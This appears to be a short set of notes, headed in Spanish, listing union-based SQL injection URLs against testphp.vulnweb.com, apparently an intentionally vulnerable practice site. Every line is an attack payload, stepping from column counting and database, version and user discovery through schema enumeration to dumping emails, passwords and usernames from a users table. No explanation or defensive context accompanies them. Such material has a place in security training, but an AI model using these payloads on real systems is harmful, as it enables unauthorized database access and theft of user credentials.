http://testphp.vulnweb.com

ataque atravez de la URL

http://testphp.vulnweb.com/artists.php?artist=1 order by 1

http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,2,3

http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,database(),3

http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,version(),current_user()

http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 0,1

http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 7,1

http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()

http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'

http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(email),3 from users

http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(pass),3 from users

http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(uname),3 from users

http://testphp.vulnweb.com/listproducts.php?cat=1 -1 union all select 1,2,3,4,5,6,7,8,table_name,10,11 from information_schema.tables

http://testphp.vulnweb.com/listproducts.php?cat=1 AND 1=1 UNION ALL SELECT 1,table_name,3,4,5,6,7,8,9,10,11 from information_schema.tables where table_schema='acuart' 

http://testphp.vulnweb.com/listproducts.php?cat=1 union select 1,2,3,4,5,6,7,8,column_name,10,11 from information_schema.columns where table_schema='acuart' and table_name='users'

http://testphp.vulnweb.com/listproducts.php?cat=1 union select 1,2,3,4,5,6,group_concat(uname,0x10a,email,pass),8,9,10,11 FROM users